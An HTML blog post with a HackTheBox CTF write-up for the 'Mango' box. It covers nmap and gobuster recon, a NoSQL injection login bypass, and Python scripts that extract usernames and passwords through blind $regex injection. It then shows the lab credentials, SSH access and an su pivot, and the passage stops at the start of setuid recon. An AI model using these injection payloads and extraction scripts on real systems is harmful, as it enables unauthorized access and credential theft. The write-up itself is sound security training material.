@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Mango - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Table of contents    User Flag  Recon NoSQL Injection Blind NoSQL data extract Pivot mango -&amp;gt; admin   Root Flag  Recon jjs setuid exploitation       Mango just retired on HackTheBox, it was an Medium rated Linux box. As usual I really liked the whole exploration process especially the custom exploitation part and learned a bit about Mongodb. I know I say this every-time but this box is my favorite box so far."/>
+<meta name="keywords" content="hackthebox, ctf, mango, mongodb, nosql injection, setuid, gtfobins"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/manguo/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+<link rel="shortcut icon" href="/img/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Mango - HackTheBox"/>
+<meta name="twitter:description" content="Mango just retired on HackTheBox, it was an Medium rated Linux box. As usual I really liked the whole exploration process especially the custom exploitation part and learned a bit about Mongodb. I know I say this every-time but this box is my favorite box so far.
+
+**Tl;Dr:** User flag was accessible after exploiting an NoSQL injection flaw to extract usernames and passwords of accounts present on the box. Those credentials can be used to SSH login to the box as `mango` then pivoting to the `admin` user holding the flag by `su` to it using the password extracted previously.  
+The root flag was accessible by exploiting the `jjs` binary that have setuid bit set allowing to read and write files on the box as `root` user.
+
+Alright! Let&#39;s get into the details now!
+"/>
+
+
+
+<meta property="og:title" content="Mango - HackTheBox" />
+<meta property="og:description" content="Mango just retired on HackTheBox, it was an Medium rated Linux box. As usual I really liked the whole exploration process especially the custom exploitation part and learned a bit about Mongodb. I know I say this every-time but this box is my favorite box so far.
+
+**Tl;Dr:** User flag was accessible after exploiting an NoSQL injection flaw to extract usernames and passwords of accounts present on the box. Those credentials can be used to SSH login to the box as `mango` then pivoting to the `admin` user holding the flag by `su` to it using the password extracted previously.  
+The root flag was accessible by exploiting the `jjs` binary that have setuid bit set allowing to read and write files on the box as `root` user.
+
+Alright! Let&#39;s get into the details now!
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/manguo/" />
+<meta property="article:published_time" content="2020-04-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-04-18T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        
+<nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/">Posts</a></li>
+        
+      
+        
+          <li><a href="/tags">Tags</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    
+    <li>
+<a href="/search" title="Search">
+<img src="/icon/search.svg" alt="search" height="20">
+</a>
+<li>
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/">Posts</a></li>
+      
+    
+      
+        <li><a href="/tags">Tags</a></li>
+      
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/posts/manguo/">Mango - HackTheBox</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-04-18
+        </span>
+
+        
+          
+        
+      
+
+      <span class="post-author">— Written by hg8</span>
+      
+        <span class="post-read-time">— 11 min read</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+          #<a href="/tags/ctf/">ctf</a>&nbsp;
+        
+          #<a href="/tags/mango/">mango</a>&nbsp;
+        
+          #<a href="/tags/mongodb/">mongodb</a>&nbsp;
+        
+          #<a href="/tags/nosql-injection/">nosql injection</a>&nbsp;
+        
+          #<a href="/tags/setuid/">setuid</a>&nbsp;
+        
+          #<a href="/tags/gtfobins/">gtfobins</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/img/mango-hackthebox.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <hr>
+<details open class="entry-toc">
+  <summary>
+    <span>
+        <b>Table of contents</b>
+    </span>
+  </summary>
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#user-flag">User Flag</a>
+      <ul>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#nosql-injection">NoSQL Injection</a></li>
+        <li><a href="#blind-nosql-data-extract">Blind NoSQL data extract</a></li>
+        <li><a href="#pivot-mango---admin">Pivot mango -&gt; admin</a></li>
+      </ul>
+    </li>
+    <li><a href="#root-flag">Root Flag</a>
+      <ul>
+        <li><a href="#recon-1">Recon</a></li>
+        <li><a href="#jjs-setuid-exploitation">jjs setuid exploitation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</details>
+
+<hr>
+<p>Mango just retired on HackTheBox, it was an Medium rated Linux box. As usual I really liked the whole exploration process especially the custom exploitation part and learned a bit about Mongodb. I know I say this every-time but this box is my favorite box so far.</p>
+<p><strong>Tl;Dr:</strong> User flag was accessible after exploiting an NoSQL injection flaw to extract usernames and passwords of accounts present on the box. Those credentials can be used to SSH login to the box as <code>mango</code> then pivoting to the <code>admin</code> user holding the flag by <code>su</code> to it using the password extracted previously.<br>
+The root flag was accessible by exploiting the <code>jjs</code> binary that have setuid bit set allowing to read and write files on the box as <code>root</code> user.</p>
+<p>Alright! Let&rsquo;s get into the details now!</p>
+<hr>
+<p>First thing first, let&rsquo;s add the box IP to the host file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.162 mango.htb&#34;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>and let&rsquo;s start!</p>
+<h2 id="user-flag">User Flag</h2>
+<h3 id="recon">Recon</h3>
+<p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nmap -sV -sT -sC mango.htb
+Nmap scan report <span style="color:#66d9ef">for</span> mango.htb <span style="color:#f92672">(</span>10.10.10.162<span style="color:#f92672">)</span>
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp  open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: <span style="color:#ae81ff">403</span> Forbidden
+443/tcp open  ssl/ssl Apache httpd <span style="color:#f92672">(</span>SSL-only mode<span style="color:#f92672">)</span>
+|_http-title: Mango | Search Base
+|_ssl-cert: Subject: commonName<span style="color:#f92672">=</span>staging-order.mango.htb/organizationName<span style="color:#f92672">=</span>Mango Prv Ltd./stateOrProvinceName<span style="color:#f92672">=</span>None/countryName<span style="color:#f92672">=</span>IN
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 33.34 seconds
+</code></pre></div><p>We have a classical web apps running on port 80 and 443 and the SSH port 22 open.</p>
+<p><code>nmap</code> scan display an interesting information about the SSL certificate on port 443:<br>
+<code>staging-order.mango.htb</code>. Let&rsquo;s add this <code>staging-order</code> to our <code>hosts</code> file since it can come useful in the future.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.162 staging-order.mango.htb&#34;</span> &gt;&gt; /etc/hosts
+</code></pre></div><p>Opening <code>http://mango.htb</code> display a forbidden page while <code>https://mango.htb</code> display a search engine:</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/68053118-74498480-fceb-11e9-90d0-6509fb84711d.png" alt="mango search engine"></p>
+<p><em>Note: Because Chrome wouldn&rsquo;t display this page because of wrong certificate I completely skipped it before noticing it was accessible with Firefox. Because of that I accidentally avoided a big rabbit-hole. Win-Win.</em></p>
+<p>Let&rsquo;s fire <code>gobuster</code> to check if we can find interesting directories and/or pages there:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ gobuster dir -u http://mango.htb/ -w ~/SecLists/Discovery/Web-Content/big.txt -x php
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+</code></pre></div><p>Nothing here it seems&hellip; Let&rsquo;s try port 443. We use option <code>-k</code> to skip SSL certificate verification:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ gobuster dir -u https://mango.htb/ -w ~/SecLists/Discovery/Web-Content/big.txt -x php -k
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/.htpasswd <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+/analytics.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/index.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
+/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+2019/11/01 21:27:59 Finished
+<span style="color:#f92672">===============================================================</span>
+</code></pre></div><p>Not a lot of results but <code>analytics.php</code> sounds interesting. After a bit of research it turned out to be a rabbit hole I will skip it.</p>
+<p>So what remain now ? Only <code>http://staging-order.mango.htb</code>.</p>
+<p>Opening it display a classic login page :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/68054811-7b729180-fcef-11e9-9355-f813b1351cea.png" alt="mango staging order"></p>
+<p><code>gobuster</code> doesn&rsquo;t find any other interesting directories or pages so let&rsquo;s focus on this login page.</p>
+<p>What do we first try when seeing a login page ? Injection of course!</p>
+<p>After a few blind tries of common injection we don&rsquo;t get any results. It&rsquo;s kind of difficult to find the right payload because we don&rsquo;t have any informations on the backend&hellip;</p>
+<p>At this point I felt a bit out of ideas at this point to be honest. Taking a break helped me clear up my mind and think more carefully about the situation.</p>
+<p>Since we are on <code>hackthebox</code> we know that box name often give tips on what&rsquo;s going on. So Mango&hellip;mango&hellip;mongo&hellip;mongodb?</p>
+<p>Mongodb might be a nice start to try new techniques on this box. As a reminder:</p>
+<blockquote>
+<p>MongoDB is a cross-platform document-oriented database program. Classified as a NoSQL database program, MongoDB uses JSON-like documents with schema.<br>
+<a href="https://www.mongodb.com/">https://www.mongodb.com/</a></p>
+</blockquote>
+<p>Mongodb is a NoSQL database software, and, as for SQL, NoSQL can be exploited by injection if input is not properly sanitized.<br>
+A lot of example are available when searching on google. This <a href="https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html">blog post</a> gives the following example to bypass a login form:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> http://target/ <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+<span style="color:#960050;background-color:#1e0010">username[$ne]=test&amp;password[$ne]=test</span>
+</code></pre></div><h3 id="nosql-injection">NoSQL Injection</h3>
+<p>Let&rsquo;s give it a try !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl <span style="color:#e6db74">&#39;http://staging-order.mango.htb/&#39;</span> --data <span style="color:#e6db74">&#34;username[</span>$ne<span style="color:#e6db74">]=test&amp;password[</span>$ne<span style="color:#e6db74">]=test&amp;login=login&#34;</span> -v
+&gt; POST / HTTP/1.1
+&gt; Host: staging-order.mango.htb
+&gt; Content-Length: <span style="color:#ae81ff">49</span>
+&gt; Content-Type: application/x-www-form-urlencoded
+&lt; HTTP/1.1 <span style="color:#ae81ff">302</span> Found
+&lt; Date: Sat, <span style="color:#ae81ff">02</span> Nov <span style="color:#ae81ff">2019</span> 20:56:09 GMT
+&lt; Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+&lt; location: home.php
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</code></pre></div><p>This time we got a <code>302 Found</code>! Seems like the injection succeed and bypassed the login form. Let&rsquo;s relaunch the request with <code>-L</code> flag to prevent <code>curl</code> from redirecting back to the login page:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ curl <span style="color:#e6db74">&#39;http://staging-order.mango.htb/&#39;</span> --data <span style="color:#e6db74">&#34;username[</span>$ne<span style="color:#e6db74">]=test&amp;password[</span>$ne<span style="color:#e6db74">]=test&amp;login=login&#34;</span> -L
+&lt;!DOCTYPE html&gt;
+&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+&lt;h1&gt;Under Plantation&lt;/h1&gt;
+&lt;h2&gt;Sorry <span style="color:#66d9ef">for</span> the inconvenience. We just started farming!&lt;/h2&gt;
+&lt;h3&gt;To contact us in the meantime please email: admin@mango.htb&lt;br /&gt;
+We rarely look at our inboxes.&lt;/h3&gt;
+&lt;/main&gt;
+&lt;/html&gt;
+</code></pre></div><p>Nothing there either&hellip; That&rsquo;s disappointing. But we are definitely on the right track.</p>
+<h3 id="blind-nosql-data-extract">Blind NoSQL data extract</h3>
+<p>Let&rsquo;s summarize what we knows:</p>
+<ul>
+<li>We can do NoSQL injection.</li>
+<li>Successful injection will return <code>302 Found</code>.</li>
+</ul>
+<p>Those two informations are enough to allow us to blindly extract data from the Mongodb instance. Here is an example :</p>
+<p>Using <a href="https://docs.mongodb.com/manual/reference/operator/query/regex/"><code>$regex</code></a> we will be able to submit a regex by injection. If the regex have a match the server will return <code>302 Found</code>. This will allows us to extract data.</p>
+<p>For example if sending the following payload<br>
+<code>username[$regex]=^a&amp;password[$ne]=test</code> return:</p>
+<ul>
+<li><code>302 Found</code> means that the regex matched, so username start with a <code>a</code>.</li>
+<li><code>200 OK</code> the regex did not match.</li>
+</ul>
+<p>Following this logic we can try with the next letter with regex <code>^ad</code>, <code>^adm</code>, <code>^admi</code> and <code>^admin</code> and so on until we get full username. You get the idea ? :)</p>
+<p>And once we have the full username we can do the exact same to extract the password.</p>
+<p>Having all of those informations in mind, we can craft a script to do the job for us :</p>
+
+
+  
+    <pre class="language-python line-numbers"
+      ><code class="language-python"
+      >import requests
+import string
+
+url = &#34;http://staging-order.mango.htb&#34;
+
+username = &#34;&#34;
+password = &#34;&#34;
+
+while True:
+    for c in string.ascii_letters&#43;string.digits:
+
+        payload = {
+            &#34;username[$regex]&#34;: &#34;^&#34;&#43;username&#43;c,
+            &#34;password[$ne]&#34;: password
+        }
+    
+        r = requests.post(url, data=payload, allow_redirects=False)
+    
+        if r.status_code == 302:
+            print(f&#34;[&#43;] Found one more char : {username&#43;c}&#34;)
+            username &#43;= c
+
+</code></pre>
+  
+
+
+<p>Let&rsquo;s try that!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python extract_user.py
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : a
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : ad
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : adm
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : admi
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : admin
+</code></pre></div><p>So the user account is &hellip;. <code>admin</code>. I think we could have guessed it after all.</p>
+<p>Let&rsquo;s now tweak our script to do the same for extracting passwords:</p>
+
+
+  
+    <pre class="language-python line-numbers"
+      ><code class="language-python"
+      >import requests
+import string
+
+url = &#34;http://staging-order.mango.htb&#34;
+
+username = sys.argv[1]
+password = &#34;&#34;
+
+while True:
+    for c in string.printable:
+
+        # We skip characters that will be interpreted as regex
+        if c not in [&#39;*&#39;, &#39;&#43;&#39;, &#39;.&#39;, &#39;?&#39;, &#39;|&#39;, &#39;$&#39;]:
+    
+            payload = {
+                &#34;username&#34;: username,
+                &#34;password[$regex]&#34;: &#34;^&#34;&#43;password&#43;c
+            }
+    
+            r = requests.post(url, data=payload, allow_redirects=False)
+    
+            if r.status_code == 302:
+                print(f&#34;[&#43;] Found one more char : {password&#43;c}&#34;)
+                password &#43;= c
+
+</code></pre>
+  
+
+
+<p>Let&rsquo;s launch it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python extract_password.py admin
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t9
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t9K
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t9Kc
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t9KcS
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t9KcS3
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t9KcS3&gt;
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t9KcS3&gt;!
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t9KcS3&gt;!0
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t9KcS3&gt;!0B
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t9KcS3&gt;!0B#
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : t9KcS3&gt;!0B#2
+</code></pre></div><p>While we could have bruteforced the <code>admin</code> username using a wordlist it definitely wouldn&rsquo;t have been possible for the password.</p>
+<p>We now have a username and a password (<code>admin</code>:<code>t9KcS3&gt;!0B#2</code>). What the first thing we do when we have those kind of informations ? Login to SSH of course:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh admin@mango.htb
+admin@mango.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+Permission denied, please try again.
+</code></pre></div><p>Nop doesn&rsquo;t work.</p>
+<p>Then maybe another user account can be extracted from Mongodb instance, let&rsquo;s tweak our regex to return an user that is not <code>admin</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff"><span style="color:#f92672">- &#34;username[$regex]&#34;: &#34;^&#34;+username+c,
+</span><span style="color:#f92672"></span><span style="color:#a6e22e">+ &#34;username[$regex]&#34;: &#34;^(?!admin)&#34;+username+c,
+</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python extract_user.py
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : m
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : ma
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : man
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : mang
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : mango
+</code></pre></div><p>We could have guessed this one aswell. Let&rsquo;s get its password:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python extract_password.py mango
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3m
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mX
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK8
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK8R
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK8Rh
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK8RhU
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK8RhU~
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK8RhU~f
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK8RhU~f<span style="color:#f92672">{</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK8RhU~f<span style="color:#f92672">{]</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK8RhU~f<span style="color:#f92672">{]</span>f
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK8RhU~f<span style="color:#f92672">{]</span>f5
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found one more char : h3mXK8RhU~f<span style="color:#f92672">{]</span>f5H
+</code></pre></div><p>Alright we have <code>mango</code>:<code>h3mXK8RhU~f{]f5H</code>, let&rsquo;s try to SSH again:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh mango@mango.htb
+mango@mango.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+Welcome to Ubuntu 18.04.2 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-64-generic x86_64<span style="color:#f92672">)</span>
+Last login: Mon Nov  <span style="color:#ae81ff">4</span> 09:50:35 <span style="color:#ae81ff">2019</span> from 10.10.15.27
+mango@mango:~$ id
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>mango<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>mango<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>mango<span style="color:#f92672">)</span>
+mango@mango:~$ ls -l
+mango@mango:~$
+</code></pre></div><p>That&rsquo;s a good step ahead! Unfortunately no user flag here&hellip;</p>
+<h3 id="pivot-mango---admin">Pivot mango -&gt; admin</h3>
+<p>Let&rsquo;s do a bit of enumeration:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mango@mango:~$ ls -l /home
+drwxr-xr-x <span style="color:#ae81ff">2</span> admin admin <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">4</span> 10:07 admin
+drwxr-xr-x <span style="color:#ae81ff">5</span> mango mango <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">4</span> 09:31 mango
+mango@mango:~$ ls -l /home/admin
+-r-------- <span style="color:#ae81ff">1</span> admin admin   <span style="color:#ae81ff">33</span> Sep <span style="color:#ae81ff">27</span> 14:29 user.txt
+</code></pre></div><p>User <code>admin</code> holds the flag. Let&rsquo;s try to access it using common method since we probably got its password (<code>t9KcS3&gt;!0B#2</code>):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mango@mango:~$ sudo -u admin cat /home/admin/user.txt
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> mango:
+mango is not in the sudoers file.  This incident will be reported.
+</code></pre></div><p>Oops, obligatory xkcd</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/68114654-dd511800-fef6-11e9-9f7f-4868af23ac2a.png" alt="incident"></p>
+<p>Maybe the simple <code>su</code> command then ?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mango@mango:~$ su - admin
+Password:
+$ id
+uid<span style="color:#f92672">=</span>4000000000<span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>
+$ bash
+admin@mango:/$ cat user.txt
+7xxxxxxxxxxxxxxxxxxxxx2
+</code></pre></div><p>Alright that was not that hard was it ? Let&rsquo;s move on to the root flag.</p>
+<h2 id="root-flag">Root Flag</h2>
+<h3 id="recon-1">Recon</h3>
+<p>One of the first I do while doing recon is to search for binaries with setuid bit enabled first. It&rsquo;s always an easy way to privilege escalation.</p>
+<p>As a reminder:</p>
+<blockquote>
+<p>Binaries with the setuid bit enabled, are being executed as if they were running under the context of the root user. This enables normal (non-privileged) users to use special privileges, like opening sockets. While this seems unnecessary for a normal user, it is actually needed for simple commands like ping.</p>
+</blockquote>
